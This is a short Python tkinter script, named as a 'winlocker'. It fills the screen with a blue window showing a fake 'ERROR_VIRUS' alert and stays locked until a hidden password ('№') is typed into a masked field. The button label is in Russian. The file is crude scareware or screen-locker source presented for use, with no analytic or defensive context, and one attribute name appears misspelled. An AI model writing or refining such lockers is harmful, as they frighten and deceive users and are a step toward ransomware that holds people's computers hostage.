import tkinter as tk
def checkpas():
    if entry.get()=="№":
        root.destroy()
def create_winlocker():
    global root,entry
    root=tk.Tk()
    root.attributes('-fullscree',True)
    root.configure(background='blue')
    label=tk.Label(root,text="ERROR_VIRUS^^^",font=("Helvetica",37),fg="White",bg="blue")
    label.pack(expand=True)


    entry=tk.Entry(root,show="*",font=("Helvetica",37),fg="red",bg="white",width=20)
    entry.pack(pady=20)
    button=tk.Button(root,text="Нажмите чтобы разблокировать",font=("Helvetica",18),command=checkpas)
    button.pack(pady=10)


    
    root.mainloop()

if __name__=="__main__":
    create_winlocker()
